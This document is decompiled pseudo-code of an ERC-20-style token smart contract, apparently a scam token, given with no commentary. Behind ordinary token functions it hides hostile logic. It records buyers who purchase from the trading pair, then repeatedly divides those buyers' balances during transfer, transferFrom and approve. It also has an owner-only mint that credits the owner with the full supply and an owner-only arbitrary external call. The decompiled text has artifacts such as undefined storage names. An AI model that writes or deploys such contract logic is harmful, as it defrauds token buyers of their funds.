contract main {




// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint8 decimals;
bool stor3;
uint256 stor3;
uint256 stor3; offset 1
uint256 totalSupply;
mapping of uint256 balanceOf;
address stor5;
address pairAddress;
uint256 stor7;
array of address sub_96194a55;
mapping of uint256 allowance;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function sub_96194a55(?) {
    require calldata.size - 4 >= 32
    require arg1 < sub_96194a55.length
    return address(sub_96194a55[arg1])
}

function pair() {
    return pairAddress
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function sub_582926cd(?) {
    require msg.sender == stor5
    sub_96194a55.length = 0
    idx = 0
    while sub_96194a55.length > idx:
        uint256(sub_96194a55[idx]) = 0
        idx = idx + 1
        continue 
}

function mint() {
    require msg.sender == stor5
    balanceOf[msg.sender] += totalSupply
    if not totalSupply:
        totalSupply = 0
    else:
        if 2 * totalSupply / totalSupply != 2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x53536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        bool(stor3.field_0) = 0
        uint255(stor3.field_1) = uint255(stor3.field_0)
}

function sub_4cc025f1(?) {
    if 2 < sub_96194a55.length:
        idx = 0
        while idx < sub_96194a55.length - 1:
            require idx < sub_96194a55.length
            mem[0] = 9
            if address(sub_96194a55[idx]) != pairAddress:
                require idx < sub_96194a55.length
                if stor7 / 20 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                require stor7 / 20
                mem[0] = address(sub_96194a55[idx])
                mem[32] = 4
                balanceOf[address(stor9[idx])] = balanceOf[address(stor9[idx])] / stor7 / 20
            idx = idx + 1
            continue 
        sub_96194a55.length = 0
        idx = 0
        while sub_96194a55.length > idx:
            uint256(sub_96194a55[idx]) = 0
            idx = idx + 1
            continue 
}

function sub_13576e0f(?) {
    require calldata.size - 4 >= 96
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + arg3.length + 36 <= calldata.size
    mem[128 len arg3.length] = arg3[all]
    mem[arg3.length + 128] = 0
    require msg.sender == stor5
    mem[ceil32(arg3.length) + 128 len floor32(arg3.length)] = call.data[arg3 + 36 len floor32(arg3.length)]
    mem[ceil32(arg3.length) + floor32(arg3.length) + -(arg3.length % 32) + 160 len arg3.length % 32] = mem[-(arg3.length % 32) + floor32(arg3.length) + 160 len arg3.length % 32]
    call arg1 with:
       funct Mask(32, -(8 * ceil32(arg3.length) + -arg3.length + 4) + 256, 0) >> -(8 * ceil32(arg3.length) + -arg3.length + 4) + 256
       value arg2 wei
         gas gas_remaining wei
        args mem[ceil32(arg3.length) + 132 len arg3.length - 4]
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg2 > 0
    allowance[msg.sender][address(arg1)] = arg2
    if 2 < sub_96194a55.length:
        idx = 0
        while idx < sub_96194a55.length - 1:
            require idx < sub_96194a55.length
            mem[0] = 9
            if address(sub_96194a55[idx]) != pairAddress:
                require idx < sub_96194a55.length
                if stor7 / 20 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                require stor7 / 20
                mem[0] = address(sub_96194a55[idx])
                mem[32] = 4
                balanceOf[address(stor9[idx])] = balanceOf[address(stor9[idx])] / stor7 / 20
            idx = idx + 1
            continue 
        sub_96194a55.length = 0
        idx = 0
        while sub_96194a55.length > idx:
            uint256(sub_96194a55[idx]) = 0
            idx = idx + 1
            continue 
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1
    require arg2 > 0
    require arg2 <= balanceOf[address(msg.sender)]
    require balanceOf[address(arg1)] + arg2 > balanceOf[address(arg1)]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(msg.sender)] -= arg2
    if arg2 + balanceOf[arg1] < balanceOf[arg1]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    if pairAddress == msg.sender:
        sub_96194a55.length++
        address(sub_96194a55[sub_96194a55.length]) = arg1
    emit Transfer(arg2, msg.sender, arg1);
    if 2 < sub_96194a55.length:
        idx = 0
        while idx < sub_96194a55.length - 1:
            require idx < sub_96194a55.length
            mem[0] = 9
            if address(sub_96194a55[idx]) != pairAddress:
                require idx < sub_96194a55.length
                if stor7 / 20 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                require stor7 / 20
                mem[0] = address(sub_96194a55[idx])
                mem[32] = 4
                balanceOf[address(stor9[idx])] = balanceOf[address(stor9[idx])] / stor7 / 20
            idx = idx + 1
            continue 
        sub_96194a55.length = 0
        idx = 0
        while sub_96194a55.length > idx:
            uint256(sub_96194a55[idx]) = 0
            idx = idx + 1
            continue 
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg3 <= allowance[address(arg1)][msg.sender]
    require arg2
    require arg3 > 0
    require arg3 <= balanceOf[address(arg1)]
    require balanceOf[address(arg2)] + arg3 > balanceOf[address(arg2)]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(arg1)] -= arg3
    if arg3 + balanceOf[arg2] < balanceOf[arg2]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
    if pairAddress == arg1:
        sub_96194a55.length++
        address(sub_96194a55[sub_96194a55.length]) = arg2
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][msg.sender]:
        revert with 0, 'SafeMath: subtraction overflow'
    allowance[address(arg1)][msg.sender] -= arg3
    if 2 < sub_96194a55.length:
        idx = 0
        while idx < sub_96194a55.length - 1:
            require idx < sub_96194a55.length
            mem[0] = 9
            if address(sub_96194a55[idx]) != pairAddress:
                require idx < sub_96194a55.length
                if stor7 / 20 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                require stor7 / 20
                mem[0] = address(sub_96194a55[idx])
                mem[32] = 4
                balanceOf[address(stor9[idx])] = balanceOf[address(stor9[idx])] / stor7 / 20
            idx = idx + 1
            continue 
        sub_96194a55.length = 0
        idx = 0
        while sub_96194a55.length > idx:
            uint256(sub_96194a55[idx]) = 0
            idx = idx + 1
            continue 
    return 1
}



}
